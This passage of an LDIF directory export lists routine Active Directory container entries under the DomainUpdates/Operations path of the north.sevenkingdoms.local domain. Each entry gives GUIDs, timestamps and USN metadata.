uSNChanged: 7822  
showInAdvancedViewOnly: TRUE  
name: 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e  
objectGUID:: gmdmCR4bp0mPjw7c2bF/6A==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# a86fe12a-0f62-4e2a-b271-d27f601f8182, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: a86fe12a-0f62-4e2a-b271-d27f601f8182  
distinguishedName: CN=a86fe12a-0f62-4e2a-b271-d27f601f8182,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7823  
uSNChanged: 7823  
showInAdvancedViewOnly: TRUE  
name: a86fe12a-0f62-4e2a-b271-d27f601f8182  
objectGUID:: x2F26NLMokKwxlZ3gOCgnQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# d85c0bfd-094f-4cad-a2b5-82ac9268475d, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: d85c0bfd-094f-4cad-a2b5-82ac9268475d  
distinguishedName: CN=d85c0bfd-094f-4cad-a2b5-82ac9268475d,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7824  
uSNChanged: 7824  
showInAdvancedViewOnly: TRUE  
name: d85c0bfd-094f-4cad-a2b5-82ac9268475d  
objectGUID:: pqVwT49A40275oiK7RhPpA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6ada9ff7-c9df-45c1-908e-9fef2fab008a, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6ada9ff7-c9df-45c1-908e-9fef2fab008a  
distinguishedName: CN=6ada9ff7-c9df-45c1-908e-9fef2fab008a,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7825  
uSNChanged: 7825  
showInAdvancedViewOnly: TRUE  
name: 6ada9ff7-c9df-45c1-908e-9fef2fab008a  
objectGUID:: VtpUhBZZrEqhuCiqJX4bog==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26  
distinguishedName: CN=10b3ad2a-6883-4fa7-90fc-6377cbdc1b26,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7826  
uSNChanged: 7826  
showInAdvancedViewOnly: TRUE  
name: 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26  
objectGUID:: 52DVnxSLNU6K/TE2L9IRxg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 98de1d3e-6611-443b-8b4e-f4337f1ded0b, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 98de1d3e-6611-443b-8b4e-f4337f1ded0b  
distinguishedName: CN=98de1d3e-6611-443b-8b4e-f4337f1ded0b,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7827  
uSNChanged: 7827  
showInAdvancedViewOnly: TRUE  
name: 98de1d3e-6611-443b-8b4e-f4337f1ded0b  
objectGUID:: LQi8Ko1IlkmolM2v2XxTow==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# f607fd87-80cf-45e2-890b-6cf97ec0e284, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: f607fd87-80cf-45e2-890b-6cf97ec0e284  
distinguishedName: CN=f607fd87-80cf-45e2-890b-6cf97ec0e284,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7828  
uSNChanged: 7828  
showInAdvancedViewOnly: TRUE  
name: f607fd87-80cf-45e2-890b-6cf97ec0e284  
objectGUID:: kUKjyoBMf0e9TnrLXxTIqg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 9cac1f66-2167-47ad-a472-2a13251310e4, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 9cac1f66-2167-47ad-a472-2a13251310e4  
distinguishedName: CN=9cac1f66-2167-47ad-a472-2a13251310e4,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7829  
uSNChanged: 7829  
showInAdvancedViewOnly: TRUE  
name: 9cac1f66-2167-47ad-a472-2a13251310e4  
objectGUID:: 120tKU6EBEixdHbtDXPJNQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6ff880d6-11e7-4ed1-a20f-aac45da48650, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6ff880d6-11e7-4ed1-a20f-aac45da48650  
distinguishedName: CN=6ff880d6-11e7-4ed1-a20f-aac45da48650,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7830  
uSNChanged: 7830  
showInAdvancedViewOnly: TRUE  
name: 6ff880d6-11e7-4ed1-a20f-aac45da48650  
objectGUID:: gqSoriR2QUO4Rp+culiYdQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 446f24ea-cfd5-4c52-8346-96e170bcb912, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 446f24ea-cfd5-4c52-8346-96e170bcb912  
distinguishedName: CN=446f24ea-cfd5-4c52-8346-96e170bcb912,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7831  
uSNChanged: 7831  
showInAdvancedViewOnly: TRUE  
name: 446f24ea-cfd5-4c52-8346-96e170bcb912  
objectGUID:: E9KPlT4cmkmpZsHoiPmdag==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 51cba88b-99cf-4e16-bef2-c427b38d0767, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 51cba88b-99cf-4e16-bef2-c427b38d0767  
distinguishedName: CN=51cba88b-99cf-4e16-bef2-c427b38d0767,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7832  
uSNChanged: 7832  
showInAdvancedViewOnly: TRUE  
name: 51cba88b-99cf-4e16-bef2-c427b38d0767  
objectGUID:: JFXp6Zv0VEWjbTKmMRWNwg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# a3dac986-80e7-4e59-a059-54cb1ab43cb9, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: a3dac986-80e7-4e59-a059-54cb1ab43cb9  
distinguishedName: CN=a3dac986-80e7-4e59-a059-54cb1ab43cb9,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7833  
uSNChanged: 7833  
showInAdvancedViewOnly: TRUE  
name: a3dac986-80e7-4e59-a059-54cb1ab43cb9  
objectGUID:: nrEvvaTBy0aC8x+yU2zp+Q==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 293f0798-ea5c-4455-9f5d-45f33a30703b, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 293f0798-ea5c-4455-9f5d-45f33a30703b  
distinguishedName: CN=293f0798-ea5c-4455-9f5d-45f33a30703b,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7834  
uSNChanged: 7834  
showInAdvancedViewOnly: TRUE  
name: 293f0798-ea5c-4455-9f5d-45f33a30703b  
objectGUID:: w0oJUpiIoEyoBXcBxLQs1w==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 5c82b233-75fc-41b3-ac71-c69592e6bf15, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 5c82b233-75fc-41b3-ac71-c69592e6bf15  
distinguishedName: CN=5c82b233-75fc-41b3-ac71-c69592e6bf15,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7835  
uSNChanged: 7835  
showInAdvancedViewOnly: TRUE  
name: 5c82b233-75fc-41b3-ac71-c69592e6bf15  
objectGUID:: mANxfjpS0E61Ds5lG0KA4A==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 7ffef925-405b-440a-8d58-35e8cd6e98c3, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 7ffef925-405b-440a-8d58-35e8cd6e98c3  
distinguishedName: CN=7ffef925-405b-440a-8d58-35e8cd6e98c3,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7836  
uSNChanged: 7836  
showInAdvancedViewOnly: TRUE  
name: 7ffef925-405b-440a-8d58-35e8cd6e98c3  
objectGUID:: LyLxtPz2l0mv9lDIHlLn4Q==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 4dfbb973-8a62-4310-a90c-776e00f83222, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 4dfbb973-8a62-4310-a90c-776e00f83222  
distinguishedName: CN=4dfbb973-8a62-4310-a90c-776e00f83222,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7837  
uSNChanged: 7837  
showInAdvancedViewOnly: TRUE  
name: 4dfbb973-8a62-4310-a90c-776e00f83222  
objectGUID:: 4f7aeHxVS0mcf2DIlYBf2w==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 8437C3D8-7689-4200-BF38-79E4AC33DFA0, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 8437C3D8-7689-4200-BF38-79E4AC33DFA0  
distinguishedName: CN=8437C3D8-7689-4200-BF38-79E4AC33DFA0,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7838  
uSNChanged: 7838  
showInAdvancedViewOnly: TRUE  
name: 8437C3D8-7689-4200-BF38-79E4AC33DFA0  
objectGUID:: Q9r1x22Nnk2WEQFZf2XJpg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 7cfb016c-4f87-4406-8166-bd9df943947f, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 7cfb016c-4f87-4406-8166-bd9df943947f  
distinguishedName: CN=7cfb016c-4f87-4406-8166-bd9df943947f,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7839  
uSNChanged: 7839  
showInAdvancedViewOnly: TRUE  
name: 7cfb016c-4f87-4406-8166-bd9df943947f  
objectGUID:: 09hGA+DGWU+GHx9M5CF6Dg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# f7ed4553-d82b-49ef-a839-2f38a36bb069, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: f7ed4553-d82b-49ef-a839-2f38a36bb069  
distinguishedName: CN=f7ed4553-d82b-49ef-a839-2f38a36bb069,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7840  
uSNChanged: 7840  
showInAdvancedViewOnly: TRUE  
name: f7ed4553-d82b-49ef-a839-2f38a36bb069  
objectGUID:: HyYKlCFm+kuiO6P+Pl+AbQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 8ca38317-13a4-4bd4-806f-ebed6acb5d0c, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c  
distinguishedName: CN=8ca38317-13a4-4bd4-806f-ebed6acb5d0c,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7841  
uSNChanged: 7841  
showInAdvancedViewOnly: TRUE  
name: 8ca38317-13a4-4bd4-806f-ebed6acb5d0c  
objectGUID:: Gv2O4XOkOkqntnVinB+bMA==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 3c784009-1f57-4e2a-9b04-6915c9e71961, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 3c784009-1f57-4e2a-9b04-6915c9e71961  
distinguishedName: CN=3c784009-1f57-4e2a-9b04-6915c9e71961,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7842  
uSNChanged: 7842  
showInAdvancedViewOnly: TRUE  
name: 3c784009-1f57-4e2a-9b04-6915c9e71961  
objectGUID:: xjNTr/SFW0iFs0ePGDUQsg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd5678-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd5678-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd5678-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7843  
uSNChanged: 7843  
showInAdvancedViewOnly: TRUE  
name: 6bcd5678-8314-11d6-977b-00c04f613221  
objectGUID:: LD8PPxiFiU6XCAxdDtrsSg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd5679-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd5679-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd5679-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7844  
uSNChanged: 7844  
showInAdvancedViewOnly: TRUE  
name: 6bcd5679-8314-11d6-977b-00c04f613221  
objectGUID:: Ys1JKPT/jUqFDzXPbZCZ1A==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd567a-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd567a-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd567a-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7845  
uSNChanged: 7845  
showInAdvancedViewOnly: TRUE  
name: 6bcd567a-8314-11d6-977b-00c04f613221  
objectGUID:: zB9ul2KRGkOaT7G35c4mfQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd567b-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd567b-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd567b-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7846  
uSNChanged: 7846  
showInAdvancedViewOnly: TRUE  
name: 6bcd567b-8314-11d6-977b-00c04f613221  
objectGUID:: x9clUczJS0K2BVu+OCjbjQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd567c-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd567c-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd567c-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7847  
uSNChanged: 7847  
showInAdvancedViewOnly: TRUE  
name: 6bcd567c-8314-11d6-977b-00c04f613221  
objectGUID:: a7tsX+safESpokpJpGRZ3Q==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd567d-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
dn: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=DomainUpdates,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: 6bcd567d-8314-11d6-977b-00c04f613221  
distinguishedName: CN=6bcd567d-8314-11d6-977b-00c04f613221,CN=Operations,CN=Do  
 mainUpdates,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7848  
uSNChanged: 7848  
showInAdvancedViewOnly: TRUE  
name: 6bcd567d-8314-11d6-977b-00c04f613221  
objectGUID:: \+mHqx7aAaUaT5ymT8UeFrw==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# 6bcd567e-8314-11d6-977b-00c04f613221, Operations, DomainUpdates, System, nort  
 h.sevenkingdoms.local  
